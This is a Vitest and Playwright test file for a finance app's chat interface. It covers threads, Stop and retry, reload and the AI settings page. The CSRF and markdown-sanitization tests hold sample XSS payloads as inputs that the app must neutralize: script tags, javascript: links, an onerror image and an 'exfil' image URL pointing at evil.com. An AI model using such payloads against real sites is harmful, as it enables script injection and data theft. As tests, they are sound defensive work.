// E04-S04 chat UI: persistent keyboard-accessible panel shows explicit
// context, saved activity/evidence and reliable Stop/retry across reloads.
// Sanitized markdown subset with no remote resource fetching.
// Real PostgreSQL (own `moneo_e04_chat_ui` DB); deterministic — no live provider.

import { randomBytes, randomUUID } from "node:crypto";
import type { Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Pool } from "pg";
import { chromium } from "@playwright/test";
import { createApp } from "../apps/web/src/server.ts";
import { createAuthRouter, requestSession, type AuthConfig } from "../apps/web/src/auth.ts";
import { createTenancyRouter } from "../apps/web/src/tenancy.ts";
import { createUiRouter } from "../apps/web/src/ui/routes.ts";
import { sendTurn, getThread, cancelTurn, retryTurn, readActivity } from "../apps/web/src/chat.ts";
import { ensureTestPool } from "./helpers/test-db.ts";
import { startStubIssuer, STUB_CLIENT_ID, STUB_CLIENT_SECRET, type StubIssuer } from "./helpers/stub-issuer.ts";

let pool: Pool;
let stub: StubIssuer;
const appServers: Server[] = [];
const sessionSecret = randomBytes(32).toString("hex");
const tag = randomBytes(4).toString("hex");

async function startApp(): Promise<string> {
  const config: AuthConfig = {
    issuer: stub.base,
    clientId: STUB_CLIENT_ID,
    clientSecret: STUB_CLIENT_SECRET,
    appBaseUrl: "http://127.0.0.1:1",
    sessionSecret,
    sessionTtlSec: 43200,
  };
  const server = createApp(
    createAuthRouter(config, pool),
    createTenancyRouter(pool, (req) => requestSession(pool, sessionSecret, req)),
    { ui: createUiRouter(pool, (req) => requestSession(pool, sessionSecret, req), { appBaseUrl: config.appBaseUrl, sessionSecret }) },
  );
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  appServers.push(server);
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  config.appBaseUrl = base;
  return base;
}

async function login(base: string, loginAs: string): Promise<string> {
  const start = await fetch(`${base}/auth/login`, { redirect: "manual" });
  const authorizeUrl = `${start.headers.get("location")!}&login_as=${loginAs}`;
  const callbackUrl = (await fetch(authorizeUrl, { redirect: "manual" })).headers.get("location")!;
  const done = await fetch(callbackUrl, { redirect: "manual" });
  return done.headers.get("set-cookie")!.split(";")[0];
}

async function call(method: string, url: string, cookie: string, body?: unknown): Promise<{ status: number; text: string; location: string | null }> {
  const res = await fetch(url, {
    method,
    redirect: "manual",
    headers: { cookie, ...(method === "POST" ? { Origin: new URL(url).origin } : {}), ...(body !== undefined ? { "Content-Type": "application/x-www-form-urlencoded" } : {}) },
    body: body !== undefined ? new URLSearchParams(body as Record<string, string>).toString() : undefined,
  });
  return { status: res.status, text: await res.text(), location: res.headers.get("location") };
}

async function setupWorkspace(base: string, sub: string, suffix: string): Promise<{ cookie: string; userId: string; workspaceId: string }> {
  const cookie = await login(base, sub);
  const ws = (await (await fetch(`${base}/api/workspaces`, {
    method: "POST",
    headers: { cookie, "Content-Type": "application/json" },
    body: JSON.stringify({ name: `W-${suffix}`, baseCurrency: "EUR" }),
  })).json()) as { id: string };
  const userId = (await pool.query("SELECT id FROM users WHERE auth_subject = $1", [sub])).rows[0].id as string;
  return { cookie, userId, workspaceId: ws.id };
}

beforeAll(async () => {
  process.env["APP_ENV"] = "test";
  pool = await ensureTestPool("E04-S04", "moneo_e04_chat_ui", ["chat_activity", "chat_attempts", "chat_turns", "chat_threads", "ai_dispatch_usage", "ai_dispatch_reservations", "ai_dispatch_budgets", "manual_transactions", "balance_snapshots", "balance_audit", "mapping_provider_usage", "mapping_provider_reservations", "mapping_proposals", "mapping_profiles", "review_decisions", "source_links", "transactions", "import_commit_batches", "parsed_observations", "source_objects", "imports", "data_sources", "background_job_attempts", "job_dispatch_index", "outbox_events", "background_job_results", "background_jobs", "ai_dispatch_permits", "ai_exclusions", "ai_policies", "command_operations", "accounts", "workspace_members", "workspaces", "users", "app_sessions"]);
  stub = await startStubIssuer();
}, 60_000);

afterAll(async () => {
  if (stub) await stub.close();
  for (const server of appServers) {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  if (pool) await pool.end();
});

describe("e04-s04 chat UI", () => {
  it("completes the 320px keyboard send and Stop journey in Chromium", async () => {
    const base = await startApp();
    const { cookie, workspaceId } = await setupWorkspace(base, `synthetic-chat-browser-${tag}`, "browser");
    const created = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Browser journey" });
    expect(created.status).toBe(303);
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await browser.newContext({ viewport: { width: 320, height: 720 } });
      const equals = cookie.indexOf("=");
      await context.addCookies([{ name: cookie.slice(0, equals), value: cookie.slice(equals + 1), url: base }]);
      const page = await context.newPage();
      await page.goto(`${base}${created.location}`, { waitUntil: "domcontentloaded", timeout: 5_000 });
      await page.getByPlaceholder("Ask about your finances...").focus();
      await page.keyboard.type("Keyboard message");
      await page.keyboard.press("Tab");
      await Promise.all([page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 5_000 }), page.keyboard.press("Enter")]);
      await page.getByRole("button", { name: "Stop" }).waitFor({ state: "visible", timeout: 5_000 });
      await page.getByRole("button", { name: "Stop" }).focus();
      await Promise.all([page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 5_000 }), page.keyboard.press("Enter")]);
      await page.getByText("Cancelled", { exact: true }).waitFor({ state: "visible", timeout: 5_000 });
    } finally {
      await browser.close();
    }
  }, 20_000);

  it("renders included-AI settings and usage", async () => {
    const base = await startApp();
    const { cookie, workspaceId } = await setupWorkspace(base, `synthetic-ai-settings-${tag}`, "settings");
    const account = await (await fetch(`${base}/api/accounts`, { method: "POST", headers: { cookie, "Content-Type": "application/json" }, body: JSON.stringify({ workspaceId, name: "Private" }) })).json() as { id: string };
    const res = await call("GET", `${base}/w/${workspaceId}/ai-settings`, cookie);
    expect(res.status).toBe(200);
    expect(res.text).toContain("Included AI settings");
    expect(res.text).toContain("Pending or unknown");
    expect(res.text).toContain("Policy version");
    expect(res.text).toContain("Private");
    const changed = await call("POST", `${base}/w/${workspaceId}/exclusions`, cookie, { accountId: account.id, excluded: "true", policyVersion: "1", returnTo: "ai-settings" });
    expect(changed.status).toBe(303);
    const stale = await call("POST", `${base}/w/${workspaceId}/exclusions`, cookie, { accountId: account.id, excluded: "false", policyVersion: "1", returnTo: "ai-settings" });
    expect(stale.status).toBe(409);
    expect(stale.text).toContain("Current policy version is 2");
  });

  it("rejects cross-origin form posts", async () => {
    const base = await startApp();
    const { cookie, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-csrf-${tag}`, "csrf");
    const res = await fetch(`${base}/w/${workspaceId}/chat/new`, { method: "POST", redirect: "manual", headers: { cookie, Origin: "https://evil.invalid", "Content-Type": "application/x-www-form-urlencoded" }, body: "title=Owned" });
    expect(res.status).toBe(403);
  });

it("renders thread list, creates thread, shows context chips, and sends a message", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-${tag}`, "list");
    const claims = { userId, workspaceId };

    // List conversations (empty initially)
    let res = await call("GET", `${base}/w/${workspaceId}/chat`, cookie);
    expect(res.status).toBe(200);
    expect(res.text).toContain("No conversations yet");
    expect(res.text).toContain("New conversation");

// Create a new thread via API directly
    const apiCreateRes = await fetch(`${base}/api/chat/threads`, {
      method: "POST",
      headers: { "Content-Type": "application/json", cookie },
      body: JSON.stringify({ workspaceId, title: "Test Chat" }),
    });
    expect(apiCreateRes.status).toBe(201);
    const apiJson = await apiCreateRes.json();
    const apiThreadId = apiJson.id;

    // Now test the UI thread creation (should also work)
    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Test Chat 2" });
    expect(createRes.status).toBe(303);
    expect(createRes.location).toBeTruthy();
    const uiThreadId = createRes.location!.split("/")[4];

    // View thread: shows context chips, empty activity, send form
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    expect(viewRes.text).toContain("Coverage:");
    expect(viewRes.text).toContain("Policy: v");
    expect(viewRes.text).toContain("eligible accounts");
    expect(viewRes.text).toContain("Send");
    expect(viewRes.text).toContain("Ask about your finances");

    // Send a user message
    const sendRes = await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Hello from UI test", idempotencyKey: randomUUID() });
    expect(sendRes.status).toBe(303);

    // Reload: should show user turn + assistant queued
    const reloadRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(reloadRes.status).toBe(200);
    expect(reloadRes.text).toContain("Hello from UI test");
    expect(reloadRes.text).toContain("You");
    expect(reloadRes.text).toContain("Queued");
  });

  it("Stop button cancels a running generation; retry re-runs it", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-stop-${tag}`, "stop");
    const claims = { userId, workspaceId };

    // Create thread
    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Stop Test" });
    const uiThreadId = createRes.location!.split("/")[4];

    // Send a message
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Stop me", idempotencyKey: randomUUID() });

    // Get the assistant turn ID (should be queued/running)
    const { getThread } = await import("../apps/web/src/chat.ts");
    const view = await getThread(pool, claims, uiThreadId);
    const assistantTurn = view!.turns.find((t) => t.role === "assistant")!;

    // Stop the generation
    const stopRes = await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/stop`, cookie);
    expect(stopRes.status).toBe(303);

    // Turn should be cancelled
    const afterStop = await getThread(pool, claims, uiThreadId);
    const stoppedTurn = afterStop!.turns.find((t) => t.id === assistantTurn.id)!;
    expect(stoppedTurn.status).toBe("cancelled");

    // Retry should re-run
    const retryRes = await call("POST", `${base}/w/${workspaceId}/chat/${assistantTurn.id}/retry`, cookie);
    expect(retryRes.status).toBe(303);

    // Should complete successfully
    const afterRetry = await getThread(pool, claims, uiThreadId);
    const retriedTurn = afterRetry!.turns.find((t) => t.id === assistantTurn.id)!;
    expect(["completed", "running", "queued"]).toContain(retriedTurn.status);
  });

  it("activity feed works for reconnect; malicious markdown is sanitized", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-md-${tag}`, "md");
    const claims = { userId, workspaceId };

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Markdown Test" });
    const uiThreadId = createRes.location!.split("/")[4];

    // Send a message with malicious markdown
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, {
      body: "Test with <script>alert(1)</script> and [evil](javascript:alert(1)) and ![img](http://evil.com/x.png)",
      idempotencyKey: randomUUID(),
    });

    // View thread - markdown should be sanitized
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    // Script tags escaped
    expect(viewRes.text).not.toContain("<script>");
    expect(viewRes.text).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    // User text is escaped rather than interpreted as markdown.
    expect(viewRes.text).not.toContain("href=\"javascript:");
    expect(viewRes.text).not.toContain("<img");

    // Activity feed endpoint returns HTML fragment
    const actRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}/activity?after=0`, cookie);
    expect(actRes.status).toBe(200);
    expect(actRes.text).toContain("user-turn");
    expect(actRes.text).toContain("assistant-queued");
  });

  it("context chips are removable and server-revalidated", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-ctx-${tag}`, "ctx");
    const claims = { userId, workspaceId };

    const account = await (await fetch(`${base}/api/accounts`, { method: "POST", headers: { cookie, "Content-Type": "application/json" }, body: JSON.stringify({ workspaceId, name: "Context account" }) })).json() as { id: string };

    const newRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Context Test" });
    const uiThreadId = newRes.location!.split("/")[4];

    // View thread - context chips present
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}?accountId=${account.id}`, cookie);
    expect(viewRes.status).toBe(200);
    expect(viewRes.text).toContain("context-chip");
    expect(viewRes.text).toContain("Context account");
    expect(viewRes.text).toContain(`name="accountId" value="${account.id}"`);

    // Send with context - the context is in the send form
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "With context", idempotencyKey: randomUUID() });

    // Server-side validation: exclude an account, next send should fail if context referenced it
    // (The server validates account eligibility at send time via authorizeAccounts)
  });

  it("reload restores turns, activity and evidence", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-reload-${tag}`, "reload");
    const claims = { userId, workspaceId };

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Reload Test" });
    const uiThreadId = createRes.location!.split("/")[4];

    // Send a message
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Persist me", idempotencyKey: randomUUID() });

    // Simulate reconnect by fetching activity from the start
    const actRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}/activity?after=0`, cookie);
    expect(actRes.status).toBe(200);
    expect(actRes.text).toContain("user-turn");
    expect(actRes.text).toContain("assistant-queued");

    // Full thread reload shows the same turns
    const { getThread } = await import("../apps/web/src/chat.ts");
    const view = await getThread(pool, claims, uiThreadId);
    expect(view!.turns.length).toBeGreaterThanOrEqual(2);
    const userTurn = view!.turns.find((t) => t.role === "user");
    expect(userTurn?.body).toBe("Persist me");
  });

  it("malicious markdown links/images are neutralized", async () => {
    const base = await startApp();
    const { cookie, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-hostile-${tag}`, "hostile");

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Hostile" });
    const uiThreadId = createRes.location!.split("/")[4];

    // Send hostile markdown
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, {
      body: `[click me](javascript:steal()) ![exfil](http://evil.com/steal?data=x) <img src=x onerror=alert(1)>`,
      idempotencyKey: randomUUID(),
    });

    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    // No script execution possible
    expect(viewRes.text).not.toContain("<script");
    expect(viewRes.text).not.toContain("<img src=x");
    expect(viewRes.text).not.toContain("href=\"javascript:");
    expect(viewRes.text).not.toContain("<img");
  });
});





